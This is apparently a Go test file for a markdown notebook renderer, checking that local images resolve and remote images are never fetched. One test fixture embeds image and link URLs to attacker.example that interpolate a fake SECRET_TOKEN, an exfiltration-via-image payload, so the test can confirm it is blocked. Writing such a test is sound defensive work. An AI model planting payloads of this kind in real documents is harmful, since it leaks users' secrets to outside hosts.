package notebook

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestImages(t *testing.T) {
	file := write(t, "![logo](img/logo.svg) and ![web](https://example.com/a.png)\n\n"+
		"```sh {#plot out=image}\necho '<svg xmlns=\"http://www.w3.org/2000/svg\"/>'\n```\n")
	dir := filepath.Dir(file)
	if err := os.MkdirAll(filepath.Join(dir, "img"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "img", "logo.svg"), []byte("<svg/>"), 0o644); err != nil {
		t.Fatal(err)
	}
	n, err := Open(file, Options{})
	if err != nil {
		t.Fatal(err)
	}
	defer n.Close()
	prose := n.Cells()[0].HTML
	logo := DocPrefix + filepath.ToSlash(filepath.Join(dir, "img", "logo.svg")) + "?v="
	if !strings.Contains(prose, `src="`+logo) || strings.Contains(prose, "https://example.com") {
		t.Errorf("prose images: %s", prose)
	}
	if err := n.RunBlock(0); err != nil {
		t.Fatal(err)
	}
	out := n.Cells()[1].Output
	plot := DocPrefix + filepath.ToSlash(filepath.Join(dir, "doc.md.assets", "plot.svg")) + "?v="
	if !strings.Contains(out, `src="`+plot) {
		t.Errorf("image output: %s", out)
	}
}

// Opening a file must not fetch anything from the network: an image
// with a remote link, filled in from the environment or not, is drawn
// as a note, in prose and in output.
func TestRemoteImagesNotLoaded(t *testing.T) {
	t.Setenv("SECRET_TOKEN", "ghp_abc123")
	file := write(t, "# Setup\n\n![logo](https://attacker.example/p.png?t={{$SECRET_TOKEN}}) and ![](//cdn.example/x.gif)"+
		" and ![f](file:///etc/x.png) and ![d](data:image/png;base64,AA)"+
		" and [docs](https://attacker.example/?t={{$SECRET_TOKEN}})\n\n"+
		"```sh {#a out=markdown}\necho hi\n```\n\n<!-- mdsh:output for=\"a\" -->\n![out <b>x</b>](https://attacker.example/o.png)\n<!-- /mdsh:output -->\n")
	n, err := Open(file, Options{})
	if err != nil {
		t.Fatal(err)
	}
	defer n.Close()
	var html, output string
	for _, c := range n.Cells() {
		html += c.HTML + c.Output
		output += c.Output
	}
	if !strings.Contains(output, "Image not loaded: out") {
		t.Errorf("output region: %q", output)
	}
	for _, bad := range []string{"<img src=\"https:", "<img src=\"//", "<img src=\"file:", "ghp_abc123", "<b>"} {
		if strings.Contains(html, bad) {
			t.Errorf("found %q in %s", bad, html)
		}
	}
	for _, want := range []string{
		`<em class="remote-image"`, "Image not loaded: logo (from attacker.example)",
		"Image not loaded (from cdn.example)", "Image not loaded: f", `src="data:image/png;base64,AA"`,
		"Image not loaded: out x (from attacker.example)",
	} {
		if !strings.Contains(html, want) {
			t.Errorf("no %q in %s", want, html)
		}
	}
}

func TestBeside(t *testing.T) {
	for link, want := range map[string]bool{
		"a.png": true, "img/a%20b.png": true, "../up.png": true,
		"/abs.png": false, "data:image/png;base64,AA": false, "https://x/a.png": false, "#frag": false,
	} {
		if _, ok := beside("/d", link); ok != want {
			t.Errorf("beside(%q) = %v, want %v", link, ok, want)
		}
	}
}
